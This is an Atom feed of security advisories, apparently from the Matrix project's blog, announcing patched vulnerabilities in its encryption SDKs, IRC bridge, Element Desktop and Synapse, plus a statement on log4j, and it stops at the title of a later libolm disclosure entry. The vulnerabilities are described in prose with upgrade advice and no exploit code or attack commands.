<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title> - Security</title>
	<link href="/category/security/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="/"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2022-09-28T17:41:33+00:00</updated>
	<id>/category/security/atom.xml</id>
	<entry xml:lang="en">
		<title>Upgrade now to address E2EE vulnerabilities in matrix-js-sdk, matrix-ios-sdk and matrix-android-sdk2</title>
		<published>2022-09-28T17:41:33+00:00</published>
		<updated>2022-09-28T17:41:33+00:00</updated>
		<link rel="alternate" href="/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients/" type="text/html"/>
		<id>/blog/2022/09/28/upgrade-now-to-address-encryption-vulns-in-matrix-sdks-and-clients/</id>
		<content type="html">&lt;p&gt;&lt;strong&gt;TL;DR:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Two critical severity vulnerabilities in end-to-end encryption were found in
the SDKs which power Element, Beeper, Cinny, SchildiChat, Circuli, Synod.im
and any other clients based on matrix-js-sdk, matrix-ios-sdk or
matrix-android-sdk2.&lt;&#x2F;li&gt;
&lt;li&gt;These have now been fixed, and we have not seen evidence of them being
exploited in the wild. All of the critical vulnerabilities require
cooperation from a malicious homeserver to be exploited.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;Please upgrade immediately in order to be protected against these
vulnerabilities.&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Clients with other encryption implementations (including Hydrogen, ElementX,
Nheko, FluffyChat, Syphon, Timmy, Gomuks and Pantalaimon) are not affected;
&lt;strong&gt;this is not a protocol bug&lt;&#x2F;strong&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;We take the security of our end-to-end encryption extremely seriously, and we
have an ongoing series of public independent audits booked to help guard
against future vulnerabilities.  We will also be making some protocol changes
in the future to provide additional layers of protection.&lt;&#x2F;li&gt;
&lt;li&gt;This resolves the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;09&#x2F;23&#x2F;pre-disclosure-upcoming-critical-security-release-of-matrix-sd-ks-and-clients&quot;&gt;pre-disclosure&lt;&#x2F;a&gt; issued on September 23rd.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;Recently we have been hard at work investigating some subtle security
vulnerabilities in certain implementations of Matrix&#x27;s end-to-end encryption
which were responsibly disclosed to us by researchers at Royal Holloway
University London, University of Sheffield and Brave Software. Two of these
vulnerabilities are critical severity, in that they could allow malicious
server admins to attack their users, and are implementation bugs in clients
using matrix-js-sdk (e.g. Element Web) or implementations derived from
matrix-js-sdk, rather than protocol flaws. matrix-rust-sdk (and other 2nd&#x2F;3rd
generation SDKs) are not affected by these.  These vulnerabilities are fixed in
today&#x27;s release, and we are not aware of them having been exploited in the
wild.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;If you&#x27;re using Element or an application that shares the same SDKs (Beeper,
Cinny, SchildiChat, Circuli, Synod.im) then please upgrade now. Do not perform
verification with new devices until you have upgraded.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to thank the security researchers for investing significant time and
effort into doing a deep dive to find these issues, and thus contributing
materially to making Matrix more secure for the whole ecosystem.  Despite our
best efforts, there is always a risk of security issues in software, and we&#x27;re
very glad to have identified and fixed these issues while also taking the
opportunity to improve our vulnerability disclosure and coordinated upgrade
process.&lt;&#x2F;p&gt;
&lt;p&gt;Please note that the critical severity issues are implementation issues in
matrix-js-sdk and derivatives, and are &lt;strong&gt;not&lt;&#x2F;strong&gt; protocol issues in Matrix. The
latest version of the researchers&#x27; paper that we&#x27;ve seen incorrectly presents
Element as &#x27;the reference Matrix client&#x27;, and confuses the higher severity
implementation bugs with lower severity protocol critique.  This is very
unfortunate, given Hydrogen, ElementX, Nheko, FluffyChat, Syphon, Timmy, Gomuks
and Pantalaimon and other independent implementations are not affected. In
fact, every client independently implemented using the Matrix spec seems to
have got it right, which speaks well of the protocol.  It&#x27;s only the first
generation SDK (predating the spec) and its derivatives which had these bugs.&lt;&#x2F;p&gt;
&lt;p&gt;The two critical severity issues lead to three attack scenarios, all of which
are prevented by today&#x27;s releases:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;Key&#x2F;Device Identifier Confusion in SAS Verification&lt;&#x2F;em&gt;&amp;quot; – A bug existed in
matrix-js-sdk where it confused together device IDs and cross-signing keys
(given under the hood, cross-signing keys are represented as devices). This
could be exploited by a malicious server admin to break emoji-based
verification when cross-signing is in use, authenticating themselves rather
than the target user being verified. This bug is only present in
matrix-js-sdk (not iOS or Android SDKs), tracked as a critical severity CVE:
CVE-2022-39250.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;Trusted Impersonation&lt;&#x2F;em&gt;&amp;quot; – matrix-js-sdk (and derived SDKs) suffered from
a protocol-confusion bug where it would incorrectly accept to-device messages
encrypted by Megolm rather than Olm, attributing them to the Megolm sender
rather than the actual sender. As a result, an attacker could fake the
trusted sender of to-device messages, allowing them to send fake to-device
messages to devices - e.g. fake keys to spoof historical messages from other
users.  This bug is tracked as a critical severity CVE: CVE-2022-39251
(matrix-js-sdk), CVE-2022-39255 (matrix-ios-sdk) and CVE-2022-39248
(matrix-android-sdk2).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;Malicious key backup&lt;&#x2F;em&gt;&amp;quot; – the above &#x27;trusted impersonation&#x27; bug in
matrix-js-sdk (and derived SDKs) could be used by a malicious homeserver
admin to add a malicious key backup to the user&#x27;s account under certain
unusual conditions in order to exfiltrate message keys. While we are not
aware of this being exploited in the wild, out of an abundance of caution we
recommend checking your key backup settings. If you are particularly paranoid
you may wish to reset your online key backup.  This doesn&#x27;t have a separate
CVE, as the root cause is the same as &amp;quot;Trusted Impersonation&amp;quot;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Three lower priority issues were also identified by the researchers:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;Semi-trusted Impersonation&lt;&#x2F;em&gt;&amp;quot; – matrix-js-sdk (and derived SDKs) accepted keys
forwarded by other users, even if your client didn&#x27;t request them. As
a result, a malicious server admin could fake an encrypted message to look as
if it was sent from a given user on that server. However, impersonated
messages like this are clearly marked  by clients like Element with a clear
&amp;quot;The authenticity of this encrypted message can&#x27;t be guaranteed&amp;quot; warning
– which is why we consider this low severity. That said, it&#x27;s an avoidable
attack, and we&#x27;ve fixed this by ensuring that clients don&#x27;t accept &#x27;unsafe&#x27;
keys (with the exception of keys forwarded when you invite a user to an
existing conversation).  In future, in Olm&#x2F;Megolm v2 we&#x27;re also linking
key-sending events to the underlying recipient Olm identity to ensure that
keys cannot be misappropriated.  This issue is tracked as a moderate severity
CVE: CVE-2022-39249 (matrix-js-sdk), CVE-2022-39257 (matrix-ios-sdk) and
CVE-2022-39246 (matrix-android-sdk2).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;Homeserver Control of Room Membership&lt;&#x2F;em&gt;&amp;quot; – A malicious homeserver can fake
invites on behalf of its users to invite malicious users into their
conversations, or add malicious devices into its users accounts.  However,
when this happens, we clearly warn the user: if you have verified the users
you are talking to, the room and user will be shown with a big red cross to
mark if malicious devices have been added.  Similarly, if an unexpected user
is invited to a conversation, all users can clearly see and take evasive
action.  Therefore we consider this a low severity issue.  That said, this
behaviour can be improved, and we&#x27;ve started work on switching our trust
model to trust-on-first-use (so that new untrusted devices are proactively
excluded from conversations, even if you haven&#x27;t explicitly verified their
owner) - and we&#x27;re also looking to add cryptographic signatures to membership
events in E2EE rooms to stop impersonated invites.  These fixes will land
over the coming months.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&amp;quot;&lt;em&gt;IND-CCA break&lt;&#x2F;em&gt;&amp;quot; – Matrix&#x27;s usage of AES-CTR to encrypt attachments, secrets
and symmetric key backups is not &amp;quot;IND-CCA2 secure&amp;quot;, because it does not
include the AES initialisation vector within the hash used to secure the
payload from tampering. As a result, if an attacker could observe the result
of both a given encryption and a given decryption operation, it would be
possible to extract the encryption private key. However, this is a purely
theoretical attack as Matrix does not provide a way to mount the attack. In
the future, we will fix our use of AES-CTR to include the IV within the hash.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We&#x27;d like to again thank Martin R. Albrecht and Dan Jones from the Information
Security Group at Royal Holloway University London, Benjamin Dowling from
Security of Advanced Systems Group, University of Sheffield and Sofía Celi from
Brave Software for discovering these issues and responsibly disclosing them to
us, and then working with us to agree on an extended disclosure window given
the amount of work needed to verify and ship fixes throughout Matrix over the
course of the summer period.  We welcome any further formal security analysis
work, and hope that it will distinguish clearly between Matrix-the-protocol and
Matrix implementations like matrix-js-sdk, rather than conflating them. You can
read their full paper &lt;a href=&quot;https:&#x2F;&#x2F;nebuchadnezzar-megolm.github.io&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d also like to thank all the downstream Element package maintainers,
downstream forks and other affected clients for working together under time
constraints for this coordinated release - your patience and understanding is
very much appreciated indeed.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, we are taking extreme measures to avoid future E2EE vulnerabilities.
You will notice that matrix-rust-sdk, hydrogen-sdk and other 2nd and 3rd
generation SDKs were not affected by the bugs at the root cause of the critical
issues here. This is &lt;strong&gt;precisely&lt;&#x2F;strong&gt; why we have been working on replacing the
first generation SDKs with a clean, carefully written Rust implementation in
the form of matrix-rust-sdk, complete with an ongoing independent public audit.&lt;&#x2F;p&gt;
&lt;p&gt;We started the process of auditing matrix-rust-sdk with the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;05&#x2F;16&#x2F;independent-public-audit-of-vodozemac-a-native-rust-reference-implementation-of-matrix-end-to-end-encryption&quot;&gt;Least Authority
vodozemac audit in May&lt;&#x2F;a&gt;, and we have three more audits agreed
– covering matrix-rust-sdk-crypto, matrix-rust-sdk, and a whole reference
Matrix stack.  Ironically, the mitigation work for these vulnerabilities in the
legacy SDKs has severely impacted our timelines for finishing
matrix-rust-sdk-crypto work (in fact, we had to push back the Least Authority
audit of matrix-rust-sdk-crypto given the
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&#x2F;milestone&#x2F;1&quot;&gt;burndown&lt;&#x2F;a&gt; has not
progressed), but we will be shifting to the new audited codebase as rapidly as
we possibly can.&lt;&#x2F;p&gt;
&lt;p&gt;Over the coming months we will also introduce our first ever major version
update of Olm and Megolm, in order to fix the MAC truncation issue highlighted
in the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;media&#x2F;Least%20Authority%20-%20Matrix%20vodozemac%20Final%20Audit%20Report.pdf&quot;&gt;vodozemac audit&lt;&#x2F;a&gt; (Issue J), and reduce the risk of further
key-forwarding issues (as per the &amp;quot;Semi-trusted Impersonation&amp;quot; vulnerability
above). New conversations will default to using v2 of Olm&#x2F;Megolm for security,
and existing conversations can be optionally upgraded (similar to a &#x27;room
version&#x27; upgrade in Matrix today). We are also adding extensive end-to-end
testing using &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;polyjuice&quot;&gt;Polyjuice&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;trafficlight&quot;&gt;Traffic
Light&lt;&#x2F;a&gt; to stress-test encryption
and improve reliability.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we will continue our research into layering Matrix over Messaging
Layer Security (MLS) - the IETF proposed standard for interoperable end-to-end
encrypted group messaging.  This work has been delayed by the mitigation
activity above, but otherwise it&#x27;s making good progress and we&#x27;re excited to
see how Decentralised MLS performs in reality against Olm+Megolm v2.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d like to apologise to the wider Matrix community for the inconvenience and
disruption of these issues, and thank you for your patience while we&#x27;ve
resolved them.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew, Denis and the Matrix cryptography &amp;amp; security teams.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Pre-disclosure: upcoming critical security release of Matrix SDKs and clients</title>
		<published>2022-09-23T14:53:12+00:00</published>
		<updated>2022-09-23T14:53:12+00:00</updated>
		<link rel="alternate" href="/blog/2022/09/23/pre-disclosure-upcoming-critical-security-release-of-matrix-sd-ks-and-clients/" type="text/html"/>
		<id>/blog/2022/09/23/pre-disclosure-upcoming-critical-security-release-of-matrix-sd-ks-and-clients/</id>
		<content type="html">&lt;p&gt;We will be releasing a security update to matrix-js-sdk, matrix-ios-sdk and matrix-android-sdk2 and clients which implement end-to-end encryption with these libraries, to patch &lt;strong&gt;critical&lt;&#x2F;strong&gt; security issues, on &lt;strong&gt;Wed, Sept 28th&lt;&#x2F;strong&gt;. The releases will be published in the afternoon, followed by the disclosure blog post around 16:00 UTC. The affected clients include Element Web, Desktop, iOS and Android.  We will also be working with downstream packagers and forks over the coming days to ensure a synchronised release to address affected clients.&lt;&#x2F;p&gt;
&lt;p&gt;Clients using matrix-rust-sdk, hydrogen-sdk and matrix-nio are not affected by these critical issues.  We are also auditing third-party client SDKs and clients in advance of the release, and will work with the projects if action is needed. So far we&#x27;ve confirmed that other popular SDK&#x2F;clients including mtxclient (nheko), Matrix Dart SDK (FluffyChat), Trixnity (Timmy), Syphon, mautrix-go (Gomuks) and mautrix-python are not affected by the issues in question.&lt;&#x2F;p&gt;
&lt;p&gt;If you maintain or package a (potentially) affected E2EE-capable Matrix client and need to coordinate on the release, please contact &lt;a href=&quot;mailto:security@matrix.org&quot;&gt;security@matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;We advise to upgrade as soon as possible after the patched versions are released.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your patience while we work to resolve this issue.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security release of matrix-appservice-irc 0.35.0 (High severity)</title>
		<published>2022-09-13T16:56:43+00:00</published>
		<updated>2022-09-13T16:56:43+00:00</updated>
		<link rel="alternate" href="/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity/" type="text/html"/>
		<id>/blog/2022/09/13/security-release-of-matrix-appservice-irc-0-35-0-high-severity/</id>
		<content type="html">&lt;p&gt;We&#x27;ve released a new version of matrix.org&#x27;s node-irc 1.3.0 and
matrix-appservice-irc 0.35.0, to patch several security issues:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;IRC mode operator confusion (Low, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;security&#x2F;advisories&#x2F;GHSA-cq7q-5c67-w39w&quot;&gt;GHSA-cq7q-5c67-w39w&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Parsing issue leading to room takeovers (High, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;security&#x2F;advisories&#x2F;GHSA-xvqg-mv25-rwvw&quot;&gt;GHSA-xvqg-mv25-rwvw&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Undisclosed issue (Moderate, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;security&#x2F;advisories&#x2F;GHSA-r3p6-cg2c-c4qw&quot;&gt;GHSA-r3p6-cg2c-c4qw&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The details of the final vulnerability will be released at a later date,
pending an audit of the codebase to ensure it&#x27;s not affected by other similar
vulnerabilities.&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerabilities have been patched in node-irc version 1.3.0 and
matrix-appservice-irc 0.35.0. You can get the release on
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;releases&quot;&gt;Github&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The bridges running on the Libera Chat, OFTC and other networks bridged by the
Matrix.org Foundation have been patched.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Please upgrade your IRC bridge as soon as possible.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The above vulnerabilities were reported by &lt;a href=&quot;https:&#x2F;&#x2F;valentin-lorentz.fr&#x2F;&quot;&gt;Val
Lorentz&lt;&#x2F;a&gt;. Thank you!&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security releases: matrix-js-sdk 19.4.0 and matrix-react-sdk 3.53.0</title>
		<published>2022-08-31T18:13:45+00:00</published>
		<updated>2022-08-31T18:13:45+00:00</updated>
		<link rel="alternate" href="/blog/2022/08/31/security-releases-matrix-js-sdk-19-4-0-and-matrix-react-sdk-3-53-0/" type="text/html"/>
		<id>/blog/2022/08/31/security-releases-matrix-js-sdk-19-4-0-and-matrix-react-sdk-3-53-0/</id>
		<content type="html">&lt;p&gt;Today we are issuing security releases of matrix-js-sdk and matrix-react-sdk to
patch a couple of High severity vulnerabilities (reserved as
&lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvekey.cgi?keyword=CVE%2D2022%2D36059&quot;&gt;CVE-2022-36059&lt;&#x2F;a&gt;
for the matrix-js-sdk and
&lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvekey.cgi?keyword=CVE%2D2022%2D36060&quot;&gt;CVE-2022-36060&lt;&#x2F;a&gt;
for the matrix-react-sdk).&lt;&#x2F;p&gt;
&lt;p&gt;Affected clients include those which depend on the affected libraries, such as
Element Web&#x2F;Desktop and Cinny. Releases of the affected clients will follow
shortly. We advise users of those clients to upgrade at their earliest
convenience.&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerabilities give an adversary who you share a room with the ability to
carry out a denial-of-service attack against the affected clients, making it
not show all of a user&#x27;s rooms or spaces and&#x2F;or causing minor temporary
corruption.&lt;&#x2F;p&gt;
&lt;p&gt;The full vulnerability details will be disclosed at a later date, to give
people time to upgrade and us to perform a more thorough audit of the codebase.&lt;&#x2F;p&gt;
&lt;p&gt;Note that while the vulnerability was to our knowledge never exploited
maliciously, some unintentional public testing has left some people affected by
the bug. We made a best effort to sanitize this to stop the breakage. If you
are affected, you may still need to clear the cache and reload your Matrix
client for it to take effect.&lt;&#x2F;p&gt;
&lt;p&gt;We thank &lt;a href=&quot;https:&#x2F;&#x2F;valentin-lorentz.fr&#x2F;&quot;&gt;Val Lorentz&lt;&#x2F;a&gt; who discovered and
reported the vulnerability over the weekend.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Security release: Synapse 1.61.1</title>
		<published>2022-06-28T16:19:45+00:00</published>
		<updated>2022-06-28T16:19:45+00:00</updated>
		<link rel="alternate" href="/blog/2022/06/28/security-release-synapse-1-61-1/" type="text/html"/>
		<id>/blog/2022/06/28/security-release-synapse-1-61-1/</id>
		<content type="html">&lt;p&gt;Hey everyone!&lt;&#x2F;p&gt;
&lt;p&gt;Today we&#x27;re exceptionally releasing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.61.1&quot;&gt;Synapse
1.61.1&lt;&#x2F;a&gt;, which comes
as a security release. &lt;strong&gt;Server administrators are encouraged to update as soon as
possible.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This release fixes a vulnerability with Synapse&#x27;s URL preview feature. URL
previews of some web pages can lead to unbounded recursion, causing the request
to either fail, or in some cases crash the running Synapse process.&lt;&#x2F;p&gt;
&lt;p&gt;Homeservers with the &lt;code&gt;url_preview_enabled&lt;&#x2F;code&gt; configuration option set to &lt;code&gt;false&lt;&#x2F;code&gt;
(the default value) are unaffected. Instances with the &lt;code&gt;enable_media_repo&lt;&#x2F;code&gt;
configuration option set to &lt;code&gt;false&lt;&#x2F;code&gt; are also unaffected, as this also disables
the URL preview functionality.&lt;&#x2F;p&gt;
&lt;p&gt;Server administrators who are unable to update Synapse should disable URL
previews by setting &lt;code&gt;url_preview_enabled: false&lt;&#x2F;code&gt; in their configuration file.
They can also delegate URL preview to a separate, dedicated worker to ensure the
process crashing does not impact other functionality of Synapse.&lt;&#x2F;p&gt;
&lt;p&gt;Please see &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-22p3-qrh9-cx32&quot;&gt;this security
advisory&lt;&#x2F;a&gt;
for more information.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>0.34.0 security release for matrix-appservice-irc (High severity)</title>
		<published>2022-05-04T11:02:24+00:00</published>
		<updated>2022-05-04T09:27:14+00:00</updated>
		<link rel="alternate" href="/blog/2022/05/04/0-34-0-security-release-for-matrix-appservice-irc-high-severity/" type="text/html"/>
		<id>/blog/2022/05/04/0-34-0-security-release-for-matrix-appservice-irc-high-severity/</id>
		<content type="html">&lt;p&gt;We&#x27;ve released updates to matrix-appservice-irc and our forked node-irc that it depends on to patch a High security vulnerability.
It&#x27;s advised to update to 0.34.0 as soon as possible.&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerability allows an attacker to manipulate a Matrix user into executing IRC commands
by having them reply to a maliciously crafted message.&lt;&#x2F;p&gt;
&lt;p&gt;Incorrect handling of a CR character allowed for making part of the message be sent to the IRC server verbatim
rather than as a message to the channel.&lt;&#x2F;p&gt;
&lt;p&gt;If you are currently a matrix-appservice-irc user, exercise caution when replying to messages from untrusted participants
in IRC bridged rooms until your bridge instance has been upgraded.&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerability has been patched in node-irc version 1.2.1 and matrix-appservice-irc 0.34.0.
You can get the release &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;releases&#x2F;tag&#x2F;0.34.0&quot;&gt;on Github&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The bridges running on the Libera Chat, OFTC and other networks bridged by the Matrix.org Foundation have been patched.&lt;&#x2F;p&gt;
&lt;p&gt;The vulnerabilities are tracked as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&#x2F;security&#x2F;advisories&#x2F;GHSA-37hr-348p-rmf4&quot;&gt;GHSA-37hr-348p-rmf4&lt;&#x2F;a&gt; and
&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;node-irc&#x2F;security&#x2F;advisories&#x2F;GHSA-52rh-5rpj-c3w6&quot;&gt;GHSA-52rh-5rpj-c3w6&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Thank you, &lt;a href=&quot;https:&#x2F;&#x2F;valentin-lorentz.fr&#x2F;&quot;&gt;Val Lorentz&lt;&#x2F;a&gt; for reporting this vulnerability.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>High severity vulnerability in Element Desktop 1.9.6 and earlier</title>
		<published>2022-01-31T14:01:24+00:00</published>
		<updated>2022-01-31T14:01:24+00:00</updated>
		<link rel="alternate" href="/blog/2022/01/31/high-severity-vulnerability-in-element-desktop-1-9-6-and-earlier/" type="text/html"/>
		<id>/blog/2022/01/31/high-severity-vulnerability-in-element-desktop-1-9-6-and-earlier/</id>
		<content type="html">&lt;p&gt;Element Desktop 1.9.6 and earlier depend on a vulnerable version of Electron, leading to a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-desktop&#x2F;security&#x2F;advisories&#x2F;GHSA-mjrg-9f8r-h3m7&quot;&gt;High severity vulnerability&lt;&#x2F;a&gt; in Element Desktop, relating to its functionality for opening downloaded files. If successfully exploited, the vulnerability allows an attacker to open an arbitrary file path on the user&#x27;s machine using the platform&#x27;s standard mechanisms, but without the ability to pass additional arguments or data to the program being executed.&lt;&#x2F;p&gt;
&lt;p&gt;However in certain platform configurations, the same vulnerability could allow an attacker to open an arbitrary URL with an arbitrary scheme instead of a file path, again using the platform&#x27;s standard mechanisms. There &lt;a href=&quot;https:&#x2F;&#x2F;positive.security&#x2F;blog&#x2F;url-open-rce&quot;&gt;has been research demonstrating&lt;&#x2F;a&gt; that the ability to open arbitrary URLs can sometimes lead to arbitrary code execution.&lt;&#x2F;p&gt;
&lt;p&gt;The attack requires user interaction and the exploit is complex. To the best of our knowledge, the vulnerability has never been exploited in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;Patched in 1.9.7 with further hardening done in 1.9.9 to ensure it&#x27;s harder to exploit even in light of new Electron vulnerabilities. Please upgrade to 1.9.9 as soon as possible. The vulnerability has been assigned &lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2022-23597&quot;&gt;CVE-2022-23597&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Discovered and reported by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;msrkp&quot;&gt;Sirius&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheGrandPew&quot;&gt;TheGrandPew&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>On Matrix and the log4j vulnerabilities</title>
		<published>2021-12-15T12:58:02+00:00</published>
		<updated>2021-12-15T12:58:02+00:00</updated>
		<link rel="alternate" href="/blog/2021/12/15/on-matrix-and-the-log4j-vulnerabilities/" type="text/html"/>
		<id>/blog/2021/12/15/on-matrix-and-the-log4j-vulnerabilities/</id>
		<content type="html">&lt;p&gt;There is currently a lot of buzz and uncertainty around a number of vulnerabilities discovered in the log4j library in the Java ecosystem. These vulnerabilities are collectively known as &amp;quot;Log4Shell&amp;quot; and currently encompass CVE-2021-44228 and CVE-2021-45046.&lt;&#x2F;p&gt;
&lt;p&gt;First and foremost, there are to our knowledge no Matrix homeservers written in Java. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;&quot;&gt;Synapse&lt;&#x2F;a&gt;, the canonical implementation developed by the Matrix Foundation and the implementation that is backing matrix.org, is written in Python and thus unaffected. P2P Matrix relies on &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;Dendrite&lt;&#x2F;a&gt;, our next-gen homeserver which is written in Go and is unaffected. &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;famedly&#x2F;conduit&#x2F;&quot;&gt;Conduit&lt;&#x2F;a&gt;, a community homeserver, is written in Rust and also unaffected. Supporting components like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sygnal&quot;&gt;Sygnal&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&quot;&gt;Sydent&lt;&#x2F;a&gt; are written in Python and unaffected.&lt;&#x2F;p&gt;
&lt;p&gt;There are two components that are commonly used in the Matrix ecosystem that do rely on Java. These are Jitsi, specifically the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;jitsi&#x2F;jitsi-videobridge&quot;&gt;Jitsi Videobridge&lt;&#x2F;a&gt; for VoIP, and &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;signald&#x2F;signald&quot;&gt;signald&lt;&#x2F;a&gt; used by the Signal bridge. Both components pull in log4j as part of their (transitive) dependencies. We&#x27;re not aware of other bridges that are dependent on Java-based components.&lt;&#x2F;p&gt;
&lt;p&gt;For both of these projects updates have been published that integrate log4j 2.15.0 covering the initial CVE and we&#x27;re currently waiting for additional updates to be published that integrate log4j 2.16.0 to cover the second. In the meantime, we&#x27;ve put all mitigations we are aware of in place on our systems and we strongly recommend everyone do the same.&lt;&#x2F;p&gt;
&lt;p&gt;For what mitigations to put in place, we recommend following the &lt;a href=&quot;https:&#x2F;&#x2F;www.lunasec.io&#x2F;docs&#x2F;blog&#x2F;log4j-zero-day-mitigation-guide&#x2F;&quot;&gt;recommendations provided by LunaSec&lt;&#x2F;a&gt;. They also provide a lot of background information on the vulnerabilities and how to audit for them.&lt;&#x2F;p&gt;
&lt;p&gt;Please keep an eye out for releases from the Jitsi and signald projects and follow their upgrade instructions to update your own deployments as soon as possible.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Disclosure: buffer overflow in libolm and matrix-js-sdk</title>
		<published>2021-12-13T18:35:18+00:00</published>
